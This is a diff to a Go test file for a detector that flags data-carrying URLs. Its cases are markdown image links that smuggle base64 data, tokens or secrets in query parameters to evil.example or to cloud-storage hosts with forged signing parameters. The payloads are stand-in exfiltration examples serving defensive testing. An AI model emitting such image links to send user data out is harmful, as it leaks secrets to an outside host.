@@ -71,18 +71,19 @@ func TestDataCarryingURLs(t *testing.T) {
 		// A signing key name without its scheme's signature parameter is not
 		// exempt, and prose under a signing key is not token-shaped.
 		"unsigned sig key": "![x](https://evil.example/p.png?X-Amz-Date=c2VjcmV0LXRva2VuLXZhbHVlLWhlcmU)",
-		"prose sig value":  "![x](https://evil.example/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Date=the+deploy+key+is+hunter2+ok)",
+		"prose sig value":  "![x](https://bucket.s3.amazonaws.com/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Date=the+deploy+key+is+hunter2+ok)",
 		// Forged signing parameters cannot carry base64 data: the signature
 		// must be well-formed, each exempt key has an exact shape, and free-data
-		// keys (security token, Policy, si) are never exempt.
-		"forged amz sig":   "![x](https://evil.example/p.png?X-Amz-Signature=a&X-Amz-Meta=" + b64 + ")",
-		"b64 amz date":     "![x](https://evil.example/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Date=" + b64 + ")",
-		"b64 amz token":    "![x](https://evil.example/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Security-Token=" + b64 + ")",
-		"b64 amz cred":     "![x](https://evil.example/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Credential=" + b64 + ")",
-		"b64 goog meta":    "![x](https://evil.example/p.png?X-Goog-Signature=" + hex64 + "&X-Goog-Meta=" + b64 + ")",
-		"b64 cf policy":    "![x](https://evil.example/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F&Policy=" + b64 + ")",
-		"b64 sas se":       "![x](https://evil.example/p.png?sig=" + sasSigQ + "&sv=2022-11-02&se=" + b64 + ")",
-		"forged sas sig":   "![x](https://evil.example/p.png?sig=a&sv=b&se=" + b64 + ")",
+		// keys (security token, Policy, si) are never exempt. These run on the
+		// provider's own host, so the shape checks reject them, not the host.
+		"forged amz sig":   "![x](https://bucket.s3.amazonaws.com/p.png?X-Amz-Signature=a&X-Amz-Meta=" + b64 + ")",
+		"b64 amz date":     "![x](https://bucket.s3.amazonaws.com/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Date=" + b64 + ")",
+		"b64 amz token":    "![x](https://bucket.s3.amazonaws.com/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Security-Token=" + b64 + ")",
+		"b64 amz cred":     "![x](https://bucket.s3.amazonaws.com/p.png?X-Amz-Signature=" + hex64 + "&X-Amz-Credential=" + b64 + ")",
+		"b64 goog meta":    "![x](https://storage.googleapis.com/b/p.png?X-Goog-Signature=" + hex64 + "&X-Goog-Meta=" + b64 + ")",
+		"b64 cf policy":    "![x](https://d111.cloudfront.net/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F&Policy=" + b64 + ")",
+		"b64 sas se":       "![x](https://acct.blob.core.windows.net/c/p.png?sig=" + sasSigQ + "&sv=2022-11-02&se=" + b64 + ")",
+		"forged sas sig":   "![x](https://acct.blob.core.windows.net/c/p.png?sig=a&sv=b&se=" + b64 + ")",
 		"jwt on evil host": "![x](https://evil.example/p.png?jwt=eyJ" + b64 + ".a.b)",
 		// Signing exemptions are bound to the provider's hosts: a well-formed
 		// signature on another host is plain data, and a lookalike suffix is
